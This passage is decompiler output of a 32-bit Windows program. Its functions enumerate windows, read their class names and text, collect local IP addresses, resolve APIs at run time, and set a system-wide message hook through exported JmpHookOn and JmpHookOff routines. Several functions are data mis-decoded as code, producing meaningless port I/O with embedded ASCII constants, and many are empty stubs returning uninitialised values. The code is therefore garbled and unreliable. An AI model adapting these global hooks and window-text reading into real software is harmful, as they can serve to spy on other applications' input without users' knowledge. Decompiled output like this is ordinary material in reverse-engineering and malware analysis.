            SetEndOfFile(&g111);
            int32_t v14 = v8 - 28; // 0x4072c4
            *(int32_t *)v14 = v13;
            CloseHandle(&g111);
            v4 = v14;
        }
    }
    // 0x4072cd
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x4072ef;
    return function_403394();
}

// Address range: 0x4072e8 - 0x4072ed
int32_t function_4072e8(void) {
    // 0x4072e8
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4072ed - 0x4072ef
int32_t function_4072ed(void) {
    // 0x4072ed
    int32_t result; // 0x4072ed
    return result;
}

// Address range: 0x4072ef - 0x4072f8
int32_t function_4072ef(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4072ef
    int32_t result; // 0x4072ef
    return result;
}

// Address range: 0x407324 - 0x407413
int32_t function_407324(void) {
    // 0x407324
    function_4036b8();
    function_4036b8();
    int32_t v1 = __readfsdword(0); // bp-40, 0x407350
    __writefsdword(0, (int32_t)&v1);
    if (function_403c90() < 0) {
        // 0x4073ac
        function_403c88();
        function_403e44();
        function_403c90();
        function_4033c4();
        function_403c90();
        function_4033c4();
        function_4071e4();
    } else {
        // 0x40737a
        function_403614();
        function_403614();
    }
    // 0x4073f8
    __writefsdword(0, v1);
    return function_403394();
}

// Address range: 0x407413 - 0x407418
int32_t function_407413(void) {
    // 0x407413
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x407418 - 0x40741a
int32_t function_407418(void) {
    // 0x407418
    int32_t result; // 0x407418
    return result;
}

// Address range: 0x40741a - 0x407424
int32_t function_40741a(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40741a
    int32_t v1; // 0x40741a
    return *(int32_t *)(v1 - 12);
}

// Address range: 0x407424 - 0x40746a
int32_t function_407424(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40742f
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g104 + 1; // 0x407435
    g104 = v2;
    if (v2 != 0) {
        // 0x40745c
        __writefsdword(0, v1);
        return 0;
    }
    // 0x40743d
    if (g34 != 0) {
        // 0x407447
        function_4071e4();
    }
    // 0x40744c
    function_403e50();
    // 0x40745c
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40746a - 0x40746f
int32_t function_40746a(void) {
    // 0x40746a
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40746f - 0x407471
int32_t function_40746f(void) {
    // 0x40746f
    int32_t result; // 0x40746f
    return result;
}

// Address range: 0x407471 - 0x407473
int32_t function_407471(int32_t a1) {
    // 0x407471
    int32_t result; // 0x407471
    return result;
}

// Address range: 0x407474 - 0x4074b6
int32_t function_407474(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40747f
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g104; // 0x407485
    g104 = v2 - 1;
    if (v2 == 0) {
        // 0x40748e
        function_403e44();
    }
    // 0x4074a8
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4074b6 - 0x4074bb
int32_t function_4074b6(void) {
    // 0x4074b6
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4074bb - 0x4074bd
int32_t function_4074bb(void) {
    // 0x4074bb
    int32_t result; // 0x4074bb
    return result;
}

// Address range: 0x4074bd - 0x4074bf
int32_t function_4074bd(int32_t a1) {
    // 0x4074bd
    int32_t result; // 0x4074bd
    return result;
}

// Address range: 0x4074c0 - 0x4074c6
bool function_4074c0(char * pszPath) {
    // 0x4074c0
    return PathFileExistsA(pszPath);
}

// Address range: 0x4074c8 - 0x407506
int32_t function_4074c8(void) {
    int32_t v1 = 260; // bp-276, 0x4074d2
    int32_t nBufferLength; // 0x4074c8
    int32_t pathSize = GetTempPathA(nBufferLength, (char *)&g111); // 0x4074d7
    if (pathSize == 0) {
        // 0x4074fe
        return 0;
    }
    int32_t v2 = &v1; // 0x4074d2
    int32_t v3 = pathSize + v2;
    if (*(char *)(v3 - 1) != 92) {
        // 0x4074e7
        *(char *)v3 = 92;
        *(char *)(pathSize + (v2 | 1)) = 0;
    }
    // 0x4074fe
    return function_4034b0();
}

// Address range: 0x407508 - 0x4075da
int32_t function_407508(int32_t a1, int32_t nIndex) {
    int32_t hWnd2 = 0; // bp-8, 0x40750b
    int32_t v1 = __readfsdword(0); // bp-40, 0x407522
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = nIndex; // bp-44, 0x40752b
    int32_t * hWnd = (int32_t *)nIndex; // 0x40752c
    bool isVisible = IsWindowVisible(hWnd); // 0x40752c
    int32_t v3 = &v2; // 0x407539
    if (isVisible) {
        int32_t v4 = nIndex; // bp-52, 0x407541
        int32_t v5 = GetClassLongA((int32_t *)-32, nIndex); // 0x407542
        v3 = &v4;
        if (v5 == 0x8002) {
            int32_t v6 = nIndex; // bp-56, 0x40754e
            int32_t * v7 = GetParent(hWnd); // 0x40754f
            v3 = &v6;
            if (*(int32_t *)(a1 + 4) == (int32_t)v7) {
                int32_t v8 = nIndex; // bp-64, 0x40755d
                int32_t v9 = &v8; // 0x40755d
                GetWindowThreadProcessId(&hWnd2, hWnd);
                v3 = v9;
                if (*(int32_t *)a1 == hWnd2) {
                    // 0x40756a
                    if (*(int32_t *)(a1 + 8) == 0) {
                        int32_t hWndParent = *(int32_t *)(a1 + 12); // 0x407594
                        int32_t hWndChildAfter = *(int32_t *)(a1 + 16); // 0x407598
                        int32_t * hWnd3 = FindWindowExA((int32_t *)hWndParent, (int32_t *)hWndChildAfter, NULL, (char *)nIndex); // 0x40759f
                        int32_t v10 = (int32_t)hWnd3; // 0x40759f
                        *(int32_t *)(a1 + 24) = v10;
                        int32_t v11 = v10; // bp-84, 0x4075aa
                        int32_t v12 = &v11; // 0x4075aa
                        v3 = v12;
                        if (IsWindow(hWnd3)) {
                            // 0x4075ba
                            *(int32_t *)(a1 + 20) = nIndex;
                            v3 = v12;
                        }
                    } else {
                        // 0x407570
                        function_4076e0();
                        function_403474();
                        function_403614();
                        v3 = v9;
                    }
                }
            }
        }
    }
    // 0x4075bf
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x4075e1;
    return function_403394();
}

// Address range: 0x4075da - 0x4075df
int32_t function_4075da(void) {
    // 0x4075da
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4075df - 0x4075e1
int32_t function_4075df(void) {
    // 0x4075df
    int32_t result; // 0x4075df
    return result;
}

// Address range: 0x4075e1 - 0x4075ec
int32_t function_4075e1(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4075e1
    int32_t result; // 0x4075e1
    return result;
}

// Address range: 0x4075ec - 0x407671
int32_t function_4075ec(int32_t a1, uint32_t a2, int32_t a3) {
    // 0x4075ec
    int32_t hWnd; // 0x4075ec
    int32_t lpdwProcessId; // 0x4075ec
    GetWindowThreadProcessId((int32_t *)hWnd, (int32_t *)lpdwProcessId);
    int32_t v1 = function_40441c(); // 0x407629
    int32_t v2; // bp-60, 0x4075ec
    int32_t v3 = &v2; // 0x40762e
    int32_t v4; // bp-40, 0x4075ec
    *(int32_t *)(v3 - 4) = (int32_t)&v4;
    *(int32_t *)(v3 - 8) = 0x407508;
    EnumWindows((bool (*)(int32_t *, int32_t))&g111, (int32_t)&g111);
    *(int32_t *)(v3 - 12) = 1;
    Sleep((int32_t)&g111);
    v3 -= 16;
    *(int32_t *)v3 = 0;
    while (!IsWindow(&g111)) {
        // 0x40764f
        if (function_40441c() - v1 > a2) {
            // break -> 0x40765a
            break;
        }
        *(int32_t *)(v3 - 4) = (int32_t)&v4;
        *(int32_t *)(v3 - 8) = 0x407508;
        EnumWindows((bool (*)(int32_t *, int32_t))&g111, (int32_t)&g111);
        *(int32_t *)(v3 - 12) = 1;
        Sleep((int32_t)&g111);
        v3 -= 16;
        *(int32_t *)v3 = 0;
    }
    // 0x40765a
    return 0;
}

// Address range: 0x407674 - 0x40768b
int32_t function_407674(void) {
    // 0x407674
    int32_t v1; // 0x407674
    return (unsigned char)((char)v1 - 33) < 94;
}

// Address range: 0x40768c - 0x4076a3
int32_t function_40768c(int32_t a1) {
    int32_t v1 = -1; // 0x407697
    int32_t v2 = 0; // 0x407697
    while (v1 != 0) {
        int32_t v3; // 0x40768c
        int32_t v4 = v3;
        v1--;
        bool v5; // 0x40768c
        v3 = v4 + (v5 ? -1 : 1);
        v2 = v1;
        if (*(char *)v4 == 0) {
            // break ->
            break;
        }
        v2 = 0;
    }
    return -2 - v2;
}

// Address range: 0x4076a4 - 0x4076b6
int32_t function_4076a4(void) {
    // 0x4076a4
    return function_403474();
}

// Address range: 0x4076b8 - 0x4076e0
int32_t function_4076b8(void) {
    int32_t v1 = -1; // 0x4076c5
    int32_t v2 = 0; // 0x4076c5
    bool v3; // 0x4076b8
    while (v1 != 0) {
        int32_t v4; // 0x4076b8
        int32_t v5 = v4;
        v1--;
        v4 = v5 + (v3 ? -1 : 1);
        v2 = v1;
        if (*(char *)v5 == 0) {
            // break ->
            break;
        }
        v2 = 0;
    }
    uint32_t v6 = v2 ^ -1; // 0x4076c7
    uint32_t v7 = v6 / 4; // 0x4076d1
    int32_t v8; // 0x4076b8
    int32_t result; // 0x4076b8
    __asm_rep_movsd_memcpy((char *)result, (char *)v8, v7);
    char * v9 = (char *)(v7 * (v3 ? -4 : 4) + result); // 0x4076db
    __asm_rep_movsb_memcpy(v9, v9, v6 & 3);
    return result;
}

// Address range: 0x4076e0 - 0x407713
int32_t function_4076e0(void) {
    // 0x4076e0
    int32_t hWnd; // 0x4076e0
    int32_t v1 = SendMessageA((int32_t *)hWnd, (int32_t)&g111, (int32_t)&g111, (int32_t)&g111); // 0x4076f4
    int32_t v2; // bp-284, 0x4076e0
    *(char *)(v1 + (int32_t)&v2) = 0;
    return function_4034b0();
}

// Address range: 0x407714 - 0x40774b
int32_t function_407714(void) {
    // 0x407714
    int32_t lpClassName; // 0x407714
    int32_t hWnd; // 0x407714
    int32_t v1 = GetClassNameA((int32_t *)hWnd, (char *)lpClassName, (int32_t)&g111); // 0x40772b
    int32_t v2; // bp-284, 0x407714
    *(char *)(v1 + (int32_t)&v2) = 0;
    return function_4034b0();
}

// Address range: 0x40774c - 0x40778b
int32_t function_40774c(void) {
    // 0x40774c
    function_4034c8();
    function_4034c8();
    return function_403728(&g111);
}

// Address range: 0x40778c - 0x4077c4
int32_t function_40778c(void) {
    // 0x40778c
    function_4034c8();
    int32_t v1; // 0x40778c
    return function_403728((int32_t *)v1);
}

// Address range: 0x4077c4 - 0x4077f3
int32_t function_4077c4(void) {
    // 0x4077c4
    function_4036c8();
    int32_t Locale = function_4036c8(); // 0x4077d8
    int32_t v1 = CompareStringA(Locale, 1, (char *)1024, (int32_t)&g111, (char *)&g111, (int32_t)&g111); // 0x4077e5
    return v1 & -256 | (int32_t)(v1 == 2);
}

// Address range: 0x4077f4 - 0x40786e
int32_t function_4077f4(void) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x407806
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // bp-36, 0x4077f4
    int32_t v3 = &v2; // 0x40780e
    int32_t hWnd; // 0x4077f4
    int32_t v4 = (int32_t)GetTopWindow((int32_t *)hWnd);
    int32_t * v5 = (int32_t *)(v3 - 4); // 0x40784e
    *v5 = v4;
    bool v6 = IsWindow(&g111); // 0x40784f
    int32_t v7 = v3; // 0x407856
    int32_t * v8 = v5; // 0x407856
    if (v6) {
        function_4076e0();
        function_4077f4();
        *(int32_t *)(v3 - 8) = 2;
        int32_t v9 = v3 - 12; // 0x407846
        *(int32_t *)v9 = v4;
        int32_t v10 = (int32_t)GetWindow(&g111, (int32_t)&g111);
        int32_t * v11 = (int32_t *)(v3 - 16);
        *v11 = v10;
        bool v12 = IsWindow(&g111); // 0x40784f
        v7 = v9;
        v8 = v11;
        while (v12) {
            int32_t v13 = v9;
            function_4076e0();
            function_4077f4();
            *(int32_t *)(v13 - 8) = 2;
            v9 = v13 - 12;
            *(int32_t *)v9 = v10;
            v10 = (int32_t)GetWindow(&g111, (int32_t)&g111);
            v11 = (int32_t *)(v13 - 16);
            *v11 = v10;
            v12 = IsWindow(&g111);
            v7 = v9;
            v8 = v11;
        }
    }
    // 0x407858
    __writefsdword(0, *v8);
    *(int32_t *)(v7 + 4) = 0x407875;
    return function_403370();
}

// Address range: 0x40786e - 0x407873
int32_t function_40786e(void) {
    // 0x40786e
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x407873 - 0x407875
int32_t function_407873(void) {
    // 0x407873
    int32_t result; // 0x407873
    return result;
}

// Address range: 0x407875 - 0x40787d
int32_t function_407875(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x407875
    int32_t result; // 0x407875
    return result;
}

// Address range: 0x407880 - 0x4078e1
int32_t function_407880(void) {
    int32_t v1 = __readfsdword(0); // bp-28, 0x407891
    __writefsdword(0, (int32_t)&v1);
    function_407714();
    function_403614();
    function_4077f4();
    __writefsdword(0, v1);
    return function_403370();
}

// Address range: 0x4078e1 - 0x4078e6
int32_t function_4078e1(void) {
    // 0x4078e1
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4078e6 - 0x4078e8
int32_t function_4078e6(void) {
    // 0x4078e6
    int32_t result; // 0x4078e6
    return result;
}

// Address range: 0x4078e8 - 0x4078ef
int32_t function_4078e8(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4078e8
    int32_t result; // 0x4078e8
    return result;
}

// Address range: 0x407903 - 0x40790b
int32_t function_407903(void) {
    // 0x407903
    int32_t v1; // 0x407903
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x407903
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    int32_t v3; // 0x407903
    char * v4 = (char *)(v3 + 81); // 0x407907
    int32_t v5; // 0x407903
    *v4 = *v4 + (char)v5;
    return result;
}

// Address range: 0x40790b - 0x40790f
float80_t function_40790b(void) {
    // 0x40790b
    float80_t v1; // 0x40790b
    return 2 * v1;
}

// Address range: 0x407910 - 0x40798f
int32_t function_407910(void) {
    int32_t v1 = __readfsdword(0); // bp-24, 0x407920
    __writefsdword(0, (int32_t)&v1);
    function_407714();
    function_403614();
    int32_t nIndex; // 0x407910
    int32_t v2 = GetWindowLongA((int32_t *)-12, nIndex); // 0x407942
    int32_t v3; // bp-32, 0x407910
    int32_t * v4 = &v3; // 0x40794c
    if (v2 != 180) {
        int32_t v5 = GetWindowLongA((int32_t *)-16, nIndex); // 0x407951
        int32_t v6; // bp-40, 0x407910
        v4 = &v6;
        if ((v5 & 32) == 0) {
            // 0x40795a
            SendMessageA(NULL, 0, 210, nIndex);
            int32_t v7; // bp-56, 0x407910
            v4 = &v7;
        }
    }
    // 0x407973
    __writefsdword(0, *v4);
    *(int32_t *)((int32_t)v4 + 8) = 0x407996;
    return function_403370();
}

// Address range: 0x40798f - 0x407994
int32_t function_40798f(void) {
    // 0x40798f
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x407994 - 0x407996
int32_t function_407994(void) {
    // 0x407994
    int32_t result; // 0x407994
    return result;
}

// Address range: 0x407996 - 0x40799c
int32_t function_407996(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407996
    int32_t result; // 0x407996
    return result;
}

// Address range: 0x4079ac - 0x407a06
int32_t function_4079ac(void) {
    // 0x4079ac
    int32_t hWnd; // 0x4079ac
    int32_t * h = GetDC((int32_t *)hWnd); // 0x4079b4
    int32_t lParam; // 0x4079ac
    SelectObject((int32_t *)SendMessageA(NULL, 0, 49, lParam), h);
    int32_t hdc; // bp-40, 0x4079ac
    GetCharWidthA(&hdc, 42, 42, h);
    SelectObject(GetStockObject(10), h);
    ReleaseDC(h, (int32_t *)lParam);
    int32_t lpPoint; // bp-84, 0x4079ac
    GetCaretPos((struct tagPOINT *)&lpPoint);
    int32_t v1 = &lpPoint; // 0x4079f8
    return (0x100000000 * (int64_t)(v1 >> 31) | (int64_t)v1) / (int64_t)(int32_t)h;
}

// Address range: 0x407a08 - 0x407b15
int32_t function_407a08(void) {
    int32_t v1 = __readfsdword(0); // bp-28, 0x407a1c
    int32_t v2 = &v1; // 0x407a1c
    __writefsdword(0, v2);
    if (g39 != 0) {
        // 0x407a31
        *(int32_t *)g39 = 0;
    }
    // 0x407a44
    int32_t v3; // 0x407a08
    int32_t v4; // 0x407a08
    if (g36 == 0) {
        // 0x407a58
        function_407b3c();
        v4 = v2;
        goto lab_0x407aff;
    } else {
        // 0x407a4e
        if (g37 != 0) {
            // 0x407a62
            v3 = g37;
            if (*(char *)&g40 == 0) {
                goto lab_0x407a8b;
            } else {
                // 0x407a6c
                if (function_407324() == 0) {
                    // 0x407a6c
                    v3 = g37;
                    goto lab_0x407a8b;
                } else {
                    // 0x407a84
                    function_407b3c();
                    v4 = v2;
                    goto lab_0x407aff;
                }
            }
        } else {
            // 0x407a58
            function_407b3c();
            v4 = v2;
            goto lab_0x407aff;
        }
    }
  lab_0x407aff:
    // 0x407aff
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x407b1c;
    return function_403370();
  lab_0x407a8b:
    // 0x407a8b
    function_403588(v3);
    function_4033c4();
    int32_t lpThreadAttributes; // bp-12, 0x407a08
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))2, (int32_t *)0x406948, 0, NULL);
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))1, (int32_t *)0x406948, 0, NULL);
    int32_t v5 = 0; // bp-112, 0x407af3
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, NULL, (int32_t *)0x406948, 0, NULL);
    function_407b3c();
    v4 = &v5;
    goto lab_0x407aff;
}

// Address range: 0x407b15 - 0x407b1a
int32_t function_407b15(void) {
    // 0x407b15
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x407b1a - 0x407b1c
int32_t function_407b1a(void) {
    // 0x407b1a
    int32_t result; // 0x407b1a
    return result;
}

// Address range: 0x407b1c - 0x407b23
int32_t function_407b1c(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x407b1c
    int32_t result; // 0x407b1c
    return result;
}

// Address range: 0x407b3c - 0x407b51
int32_t function_407b3c(void) {
    // 0x407b3c
    function_403370();
    return function_403370();
}

// Address range: 0x407b54 - 0x407bbd
int32_t function_407b54(void) {
    int32_t v1 = 257; // bp-488, 0x407b65
    int32_t v2; // 0x407b54
    int32_t v3; // 0x407b54
    WSAStartup((int16_t)v3, (struct WSAData *)v2);
    function_403370();
    int32_t namelen = &v1; // 0x407b7c
    int32_t name = namelen; // bp-496, 0x407b7c
    gethostname((char *)64, namelen);
    char * v4 = (char *)&name; // bp-500, 0x407b82
    struct hostent * v5 = gethostbyname((char *)&name); // 0x407b83
    int32_t result = (int32_t)v5; // 0x407b83
    if (v5 == NULL) {
        // 0x407bb2
        return result;
    }
    int32_t v6 = *(int32_t *)(result + 12); // 0x407b8c
    int32_t v7 = *(int32_t *)v6; // 0x407ba6
    if (v7 != 0) {
        int32_t v8 = 0; // 0x407ba5
        int32_t v9 = (int32_t)&v4;
        int32_t v10 = v9; // 0x407b95
        if (v8 == 0) {
            // 0x407b97
            v10 = v9 - 4;
            *(int32_t *)v10 = *(int32_t *)v7;
            inet_ntoa((struct {int32_t e0;}){.e0 = (int32_t)&g111});
            function_4076a4();
        }
        // 0x407ba5
        v8++;
        int32_t v11 = *(int32_t *)(4 * v8 + v6); // 0x407ba6
        while (v11 != 0) {
            // 0x407b93
            v9 = v10;
            v10 = v9;
            if (v8 == 0) {
                // 0x407b97
                v10 = v9 - 4;
                *(int32_t *)v10 = *(int32_t *)v11;
                inet_ntoa((struct {int32_t e0;}){.e0 = (int32_t)&g111});
                function_4076a4();
            }
            // 0x407ba5
            v8++;
            v11 = *(int32_t *)(4 * v8 + v6);
        }
    }
    // 0x407bb2
    return WSACleanup();
}

// Address range: 0x407bc0 - 0x407bd1
int32_t function_407bc0(void) {
    // 0x407bc0
    return function_4033c4();
}

// Address range: 0x407bd7 - 0x407cab
int32_t function_407bd7(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407bd7
    int32_t v1; // 0x407bd7
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x407bda
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x407c44
        __writefsdword(0, a3);
        return 0;
    }
    // 0x407bde
    int32_t v4; // 0x407bd7
    int16_t v5 = v4; // 0x407bfc
    int32_t v6; // 0x407bd7
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x407bd7
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x407c02
    int32_t v9; // 0x407bd7
    char * v10 = (char *)v9; // 0x407c02
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x407c07
    int64_t v12 = 103 * v11; // 0x407c07
    int32_t v13 = v12; // 0x407c07
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x407c0c
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x407c11
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x407c7c
        unsigned char v17 = v16 + v2; // 0x407c7c
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x407c80
            return function_407bc0();
        }
        // 0x407c95
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x407cb2;
        return function_403370();
    }
    // 0x407c16
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v18 = (int32_t *)(v13 - 16); // 0x407c1b
    *v18 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v19 = v13 + 4; // 0x407c2c
    int32_t * v20 = (int32_t *)v19; // 0x407c2c
    int32_t v21 = *v20; // 0x407c2c
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v22 = (char *)v21; // 0x407c32
    *v22 = *v22 + (char)v21;
    *v20 = *v18;
    *(int32_t *)v13 = v19;
    *v14 = 0x407c59;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x407cab - 0x407cb0
int32_t function_407cab(void) {
    // 0x407cab
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x407cb0 - 0x407cb2
int32_t function_407cb0(void) {
    // 0x407cb0
    int32_t result; // 0x407cb0
    return result;
}

// Address range: 0x407cb2 - 0x407cb5
int32_t function_407cb2(int32_t a1, int32_t a2) {
    // 0x407cb2
    int32_t result; // 0x407cb2
    return result;
}

// Address range: 0x407cb8 - 0x407cd6
int32_t function_407cb8(int32_t nCode, int32_t wParam, int32_t lParam) {
    // 0x407cb8
    int32_t hhk; // 0x407cb8
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, lParam);
}

// Address range: 0x407cd8 - 0x407d01
int32_t JmpHookOn(void) {
    int32_t * v1 = SetWindowsHookExA(0, g83, (int32_t *)0x407cb8, 3); // 0x407ce8
    g106 = (int32_t)v1;
    return v1 != NULL;
}

// Address range: 0x407d04 - 0x407d10
int32_t JmpHookOff(void) {
    // 0x407d04
    return UnhookWindowsHookEx((int32_t *)g106);
}

// Address range: 0x407d10 - 0x407d21
int32_t function_407d10(void) {
    // 0x407d10
    return function_4033c4();
}

// Address range: 0x407d27 - 0x407dfb
int32_t function_407d27(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407d27
    int32_t v1; // 0x407d27
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x407d2a
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x407d94
        __writefsdword(0, a3);
        return 0;
    }
    // 0x407d2e
    int32_t v4; // 0x407d27
    int16_t v5 = v4; // 0x407d4c
    int32_t v6; // 0x407d27
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x407d27
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x407d52
    int32_t v9; // 0x407d27
    char * v10 = (char *)v9; // 0x407d52
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x407d57
    int64_t v12 = 103 * v11; // 0x407d57
    int32_t v13 = v12; // 0x407d57
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x407d5c
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x407d61
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x407dcc
        unsigned char v17 = v16 + v2; // 0x407dcc
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x407dd0
            return function_407d10();
        }
        // 0x407de5
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x407e02;
        return function_403370();
    }
    // 0x407d66
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v18 = (int32_t *)(v13 - 16); // 0x407d6b
    *v18 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v19 = v13 + 4; // 0x407d7c
    int32_t * v20 = (int32_t *)v19; // 0x407d7c
    int32_t v21 = *v20; // 0x407d7c
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v22 = (char *)v21; // 0x407d82
    *v22 = *v22 + (char)v21;
    *v20 = *v18;
    *(int32_t *)v13 = v19;
    *v14 = 0x407da9;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x407dfb - 0x407e00
int32_t function_407dfb(void) {
    // 0x407dfb
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x407e00 - 0x407e02
int32_t function_407e00(void) {
    // 0x407e00
    int32_t result; // 0x407e00
    return result;
}

// Address range: 0x407e02 - 0x407e05
int32_t function_407e02(int32_t a1, int32_t a2) {
    // 0x407e02
    int32_t result; // 0x407e02
    return result;
}

// Address range: 0x407e08 - 0x407e0e
int32_t * function_407e08(int32_t * Base, char MappedAsImage, int16_t DirectoryEntry, int32_t * Size) {
    // 0x407e08
    return ImageDirectoryEntryToData(Base, MappedAsImage, DirectoryEntry, Size);
}

// Address range: 0x407e10 - 0x407e35
int32_t function_407e10(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x407e1b
    __writefsdword(0, (int32_t)&v1);
    g107++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x407e35 - 0x407e3a
int32_t function_407e35(void) {
    // 0x407e35
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x407e3a - 0x407e3c
int32_t function_407e3a(void) {
    // 0x407e3a
    int32_t result; // 0x407e3a
    return result;
}

// Address range: 0x407e3c - 0x407e3e
int32_t function_407e3c(int32_t a1) {
    // 0x407e3c
    int32_t result; // 0x407e3c
    return result;
}

// Address range: 0x407e40 - 0x407e48
int32_t function_407e40(void) {
    // 0x407e40
    g107--;
    int32_t result; // 0x407e40
    return result;
}

// Address range: 0x407ea0 - 0x407f2c
int32_t function_407ea0(char * a1, char * a2, int32_t a3) {
    // 0x407ea0
    int32_t v1; // bp-20, 0x407ea0
    int32_t * v2 = &v1; // 0x407ea9
    int32_t result; // 0x407ea0
    int32_t v3; // 0x407ea0
    if ((char)v3 != 0) {
        // 0x407eab
        int32_t v4; // 0x407ea0
        int32_t v5; // 0x407ea0
        int32_t v6; // 0x407ea0
        int32_t v7; // 0x407ea0
        int32_t v8; // 0x407ea0
        result = function_402af0(v6, v8, v7, v5, v4);
        int32_t v9; // bp-36, 0x407ea0
        v2 = &v9;
    }
    int32_t v10 = (int32_t)v2;
    int32_t * moduleHandle = GetModuleHandleA((char *)(v3 & 255)); // 0x407ec1
    int32_t * v11 = (int32_t *)(result + 8); // 0x407ec6
    *v11 = (int32_t)moduleHandle;
    int32_t v12 = v10 - 4; // 0x407ecd
    if (moduleHandle != NULL) {
        int32_t v13 = (int32_t)a1; // 0x407eb8
        *(int32_t *)(result + 12) = v13;
        int32_t * v14 = (int32_t *)(result + 16); // 0x407ed5
        *v14 = (int32_t)a2;
        int32_t * v15 = (int32_t *)(result + 20); // 0x407edb
        *v15 = a3;
        *(int32_t *)(v10 - 8) = *v14;
        *(int32_t *)(v10 - 12) = v13;
        int32_t * moduleHandle2 = GetModuleHandleA((char *)&g111); // 0x407ee3
        int32_t v16 = v10 - 16; // 0x407ee8
        *(int32_t *)v16 = (int32_t)moduleHandle2;
        int32_t (*func)() = GetProcAddress(&g111, (char *)&g111); // 0x407ee9
        *(int32_t *)(result + 24) = (int32_t)func;
        v12 = v16;
        if (func != NULL) {
            // 0x407ef7
            *(int32_t *)(v10 - 20) = *v15;
            int32_t v17 = v10 - 24; // 0x407efe
            *(int32_t *)v17 = *v11;
            function_407f74((int32_t)&g111);
            v12 = v17;
        }
    }
    if ((char)v3 != 0) {
        // 0x407f13
        function_402b48();
        __writefsdword(0, *(int32_t *)v12);
    }
    // 0x407f22
    return result;
}

// Address range: 0x407f2c - 0x407f74
int32_t function_407f2c(void) {
    int32_t v1 = function_402b58(); // 0x407f2e
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x407f37
    int32_t v3 = v1; // 0x407f3b
    if (*v2 != 0) {
        int32_t * v4 = (int32_t *)(v1 + 24); // 0x407f3d
        v3 = v1;
        if (*v4 != 0) {
